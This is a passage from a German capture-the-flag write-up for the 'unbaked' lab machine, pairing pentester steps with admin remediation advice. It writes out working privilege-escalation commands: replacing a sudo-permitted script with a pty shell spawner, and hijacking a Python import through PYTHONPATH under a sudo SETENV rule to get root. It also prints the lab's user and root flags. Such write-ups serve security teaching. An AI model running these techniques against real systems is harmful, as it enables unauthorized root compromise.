                <br><strong>Empfehlung (Admin):</strong> Wie zuvor betont: Vermeiden Sie Sudo-Regeln, die die Ausführung von modifizierbaren Skripten erlauben. Stellen Sie sicher, dass kritische Skripte nur von vertrauenswürdigen Benutzern und aus sicheren, nicht beschreibbaren Verzeichnissen ausgeführt werden können. Überprüfen Sie Sudo-Berechtigungen regelmäßig auf solche Fehlkonfigurationen.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">mv vuln.py vuln.py.old</span>
ramsey@unbaked:~$ <span class="command">echo 'import pty;pty.spawn("/bin/bash")' > vuln.py</span>
ramsey@unbaked:~$ <span class="command">chmod +x vuln.py</span>
ramsey@unbaked:~$ <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>
<span class="password">oliver@unbaked:~$</span> 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Als Benutzer <span class="command">oliver</span> führe ich erneut den Befehl <span class="command">sudo -l</span> aus, um meine Sudo-Berechtigungen zu überprüfen.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Sudo-Ausgabe für Benutzer <span class="command">oliver</span> enthüllt eine weitere kritische Fehlkonfiguration, die diesmal zur Root-Privilegien-Eskalation führen kann: <span class="password">User oliver may run the following commands on unbaked: (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py</span>. Diese Regel erlaubt es Benutzer <span class="command">oliver</span>, das Skript <span class="command">/opt/dockerScript.py</span> als Benutzer <span class="command">root</span> auszuführen, **ohne ein Passwort eingeben zu müssen** (<span class="command">NOPASSWD</span>). Das zusätzliche <span class="command">SETENV</span>-Flag ist hier besonders gefährlich, da es erlaubt, Umgebungsvariablen beizubehalten oder zu setzen, was bei der Ausnutzung von Python-Skripten nützlich sein kann. Die Fähigkeit, ein Python-Skript als Root mit Kontrolle über Umgebungsvariablen auszuführen, ist ein häufiger Vektor für Root-Zugriff.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode von <span class="command">/opt/dockerScript.py</span>. Da Sie es als Root ausführen dürfen und <span class="command">SETENV</span> gesetzt ist, suchen Sie nach Möglichkeiten, die Ausführung des Skripts zu manipulieren (z.B. durch Hijacking von Modul-Imports über die <span class="command">PYTHONPATH</span> Umgebungsvariable), um eine Root-Shell zu erlangen.
                <br><strong>Empfehlung (Admin):</strong> **Kritische Sicherheitswarnung:** Sudo-Regeln mit <span class="command">NOPASSWD</span> sind riskant und sollten nur mit äußerster Vorsicht verwendet werden, insbesondere für Skripte oder Interpreter wie Python, die potenziell zur Code-Ausführung missbraucht werden können. Vermeiden Sie das <span class="command">SETENV</span>-Flag bei Sudo-Regeln, es sei denn, dies ist absolut notwendig und die Auswirkungen sind vollständig verstanden. Führen Sie regelmäßige Sudo-Audits durch und prüfen Sie Regeln gegen bekannte Ausnutzungsmethoden (z.B. GTFOBins).
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
oliver@unbaked:~$ <span class="command">sudo -l</span>
<span class="command">Matching Defaults entries for oliver on unbaked:</span>
    <span class="command">env_reset, mail_badpass,</span>
    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>

<span class="password">User oliver may run the following commands on unbaked:</span>
    <span class="password">(root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich betrachte den Quellcode des Skripts <span class="command">/opt/dockerScript.py</span>, das ich als Root ausführen darf. Das Skript ist kurz und importiert das <span class="command">docker</span>-Modul. Die Hauptfunktion ist das Ausführen eines Docker-Containers (<span class="command">client.containers.run(...)</span>). Der Import des <span class="command">docker</span>-Moduls ist hier der entscheidende Punkt. Da ich das Skript als Root mit <span class="command">SETENV</span> ausführen darf, kann ich die Umgebungsvariable <span class="command">PYTHONPATH</span> manipulieren. Die <span class="command">PYTHONPATH</span>-Variable gibt Python zusätzliche Verzeichnisse an, in denen es nach Modulen suchen soll, bevor es die Standardpfade verwendet. Indem ich <span class="command">PYTHONPATH</span> auf ein Verzeichnis setze, auf das ich Schreibzugriff habe (z.B. <span class="command">/tmp</span>) und dort eine eigene Datei namens <span class="command">docker.py</span> ablege, kann ich den legitimen Import des <span class="command">docker</span>-Moduls "hijacken". Wenn das Skript <span class="command">/opt/dockerScript.py</span> ausgeführt wird, wird es zuerst in <span class="command">/tmp</span> nach <span class="command">docker.py</span> suchen und meinen bösartigen Code ausführen, anstatt das echte <span class="command">docker</span>-Modul zu importieren.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Diese Kombination aus einer Sudo-Regel, die die Ausführung eines Python-Skripts als Root mit <span class="command">SETENV</span> erlaubt, und einem Skript, das Module importiert, ist eine klassische Privilegien-Eskalations-Schwachstelle. Die Ausnutzung der <span class="command">PYTHONPATH</span> ist ein bewährter Weg, um die Kontrolle über das ausgeführte Root-Skript zu erlangen. Mein Plan ist nun, eine einfache <span class="command">docker.py</span>-Datei in <span class="command">/tmp</span> zu erstellen, die mir eine Root-Shell gibt, und dann das verwundbare Skript mit manipulierter <span class="command">PYTHONPATH</span> auszuführen.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Erstellen Sie in einem beschreibbaren Verzeichnis (wie <span class="command">/tmp</span>) eine Datei namens <span class="command">docker.py</span>, die Python-Code zur Erlangung einer Shell enthält (z.B. <span class="command">import os; os.system("/bin/bash")</span> oder <span class="command">import pty; pty.spawn("/bin/bash")</span>). Führen Sie dann das Skript <span class="command">/opt/dockerScript.py</span> mit <span class="command">sudo</span> aus, wobei die <span class="command">PYTHONPATH</span> auf das Verzeichnis gesetzt ist, das Ihre falsche <span class="command">docker.py</span> enthält: <span class="command">sudo PYTHONPATH=/tmp python /opt/dockerScript.py</span>.
                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie das <span class="command">SETENV</span>-Flag für alle Sudo-Regeln, es sei denn, es gibt einen zwingenden Grund dafür und die Risiken sind minimiert. Wenn <span class="command">SETENV</span> notwendig ist, stellen Sie sicher, dass keine kritischen Umgebungsvariablen wie <span class="command">PYTHONPATH</span>, <span class="command">LD_PRELOAD</span>, <span class="command">PATH</span> etc. manipuliert werden können, die die Skriptausführung beeinflussen könnten. Führen Sie Python-Skripte mit Sudo mit Bedacht aus und erwägen Sie die Verwendung von Python-eigenen Virtual Environments oder anderen Isolationsmechanismen, um Modul-Hijacking zu verhindern.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
oliver@unbaked:~$ <span class="command">cat /opt/dockerScript.py</span>
<span class="command">import docker</span>

<span class="password"># oliver, make sure to restart docker if it crashes or anything happened.</span>
<span class="password"># i havent setup swap memory for it</span>
<span class="password"># it is still in development, please dont let it live yet!!!</span>
<span class="command">client = docker.from_env()</span>
<span class="command">client.containers.run("python-django:latest", "sleep infinity", detach=True)</span>
</pre>
                 </div>
            </div>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
oliver@unbaked:~$ <span class="command">ls -la /opt/dockerScript.py</span>
<span class="command">-rwxr-x--- 1 root sysadmin 290 Oct  3  2020 /opt/dockerScript.py</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich führe nun den finalen Privilegien-Eskalationsschritt aus. Ich wechsle in ein beschreibbares Verzeichnis (<span class="command">cd /tmp/</span>). Dort erstelle ich eine Datei namens <span class="command">docker.py</span>, die einen einfachen Python-Befehl zur Erlangung einer interaktiven Shell enthält: <span class="command">'import pty;pty.spawn("/bin/bash")'</span>. Dieser Code wird ausgeführt, wenn das Skript <span class="command">/opt/dockerScript.py</span> versucht, das <span class="command">docker</span>-Modul zu importieren und dabei meine gefälschte Datei in <span class="command">/tmp</span> findet, bevor es das echte Modul findet.
                <br>Dann führe ich den Befehl <span class="command">sudo PYTHONPATH=/tmp python /opt/dockerScript.py</span> aus.
                <br>- <span class="command">sudo</span>: Führt den Befehl mit Root-Berechtigungen aus.
                <br>- <span class="command">PYTHONPATH=/tmp</span>: Setzt die Umgebungsvariable <span class="command">PYTHONPATH</span> für diesen Befehl auf <span class="command">/tmp</span>.
                <br>- <span class="command">python /opt/dockerScript.py</span>: Der eigentliche Befehl, der von Sudo ausgeführt wird.
                <br>Durch die Kombination von Sudo als Root, <span class="command">SETENV</span> (impliziert durch das Funktionieren der <span class="command">PYTHONPATH</span>-Manipulation) und der manipulierten <span class="command">PYTHONPATH</span> wird mein bösartiges <span class="command">docker.py</span> ausgeführt.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Fantastisch, der Root-Zugriff war erfolgreich, nun haben wir unser Ziel erreicht! Die Ausführung des Befehls führt direkt zu einer Root-Shell auf dem Host-System (<span class="password">root@unbaked:/tmp#</span>). Dies ist die culmination des Privilegien-Eskalationspfads. Die Schwachstelle lag in der fehlerhaften Sudo-Regel, die die Ausführung eines Python-Skripts als Root erlaubte, kombiniert mit dem <span class="command">SETENV</span>-Flag, das das Hijacking des Modulimports über <span class="command">PYTHONPATH</span> ermöglichte.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Sie haben nun vollständige Kontrolle über das Host-System als Root. Lokalisieren und lesen Sie die Root-Flag (<span class="command">root.txt</span>). Sichern Sie alle anderen sensiblen Daten, die für den Bericht relevant sind.
                <br><strong>Empfehlung (Admin):</strong> Dies demonstriert die schwerwiegenden Folgen einer falsch konfigurierten Sudo-Regel. Überprüfen Sie alle Sudo-Konfigurationen, entfernen Sie das <span class="command">SETENV</span>-Flag, wo immer möglich, und beschränken Sie die Ausführung von Skripten oder Interpretern als Root. Implementieren Sie strengere Kontrollen für Dateiberechtigungen in sensitiven Verzeichnissen wie `/opt`.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
oliver@unbaked:~$ <span class="command">cd /tmp/</span>
oliver@unbaked:/tmp$ <span class="command">echo 'import pty;pty.spawn("/bin/bash")' > docker.py</span>
oliver@unbaked:/tmp$ <span class="command">sudo PYTHONPATH=/tmp python /opt/dockerScript.py</span>
<span class="password">root@unbaked:/tmp#</span> 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Nachdem ich Root-Zugriff auf dem Host-System erlangt habe, ist das letzte Ziel, die Root-Flag zu finden. Standardmäßig befindet sich die Root-Flag (`root.txt`) oft im Home-Verzeichnis des Root-Benutzers (<span class="command">/root/</span>). Ich navigiere zum <span class="command">/root</span>-Verzeichnis (<span class="command">cd /root</span>) und liste dessen Inhalt auf (<span class="command">ls</span>). Dort finde ich die Datei <span class="command">root.txt</span>. Um den Inhalt zu lesen und die Root-Flag zu erhalten, verwende ich den Befehl <span class="command">cat root.txt</span>.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Erfolgreich! Die Ausgabe von <span class="command">cat root.txt</span> zeigt die erwartete Root-Flag: <span class="password">Unb4ked_GOtcha!</span>. Die Flag-Nachricht ist eine Bestätigung für den erfolgreichen Abschluss des Pentests und die vollständige Kompromittierung des Systems bis zur Root-Ebene. Ebenso wird die User Flag (<span class="command">user.txt</span>) hier nochmals für die vollständige Dokumentation erfasst.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie beide gefundenen Flags im finalen Bericht im dafür vorgesehenen Flags-Abschnitt.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Root-Flag-Datei (<span class="command">root.txt</span>) nur für den Root-Benutzer lesbar ist (Berechtigungen 400 oder 600). Führen Sie regelmäßige Berechtigungsprüfungen auf sensiblen Dateien durch.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
root@unbaked:/tmp# <span class="command">cd /root</span>
root@unbaked:/root# <span class="command">ls</span>
<span class="command">root.txt</span>
root@unbaked:/root# <span class="command">cat root.txt</span> 
<span class="password">CONGRATS ON PWNING THIS BOX!</span>
<span class="password">Created by ch4rm & H0j3n</span>
<span class="password">ps: dont be mad us, we hope you learn something new</span>

<span class="password">flag: Unb4ked_GOtcha!</span>
root@unbaked:/root# 
</pre>
                 </div>
            </div>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="flag-entry">
                    <div class="flag-command">cat /home/ramsey/user.txt</div>
                    <div class="flag-value"><span class="password">Unb4ked_W00tw00t</span></div>
                </div>
                <div class="flag-entry">
                    <div class="flag-command">cat /root/root.txt</div>
                    <div class="flag-value"><span class="password">Unb4ked_GOtcha!</span></div>
                </div>
            </div>
        </section>


    </div> <!-- Ende container -->

    <footer class="footer">
        <p>Ben - Cyber Security Reports</p>
        <p>Berichtsdatum: 16. Juni 2025</p>
    </footer>

    <!-- Anmerkungen zu Bildnamen (falls zutreffend). Dieser Block wird nur hinzugefügt, wenn Bilder im Text gefunden und verarbeitet wurden. -->


</body>
</html>
			
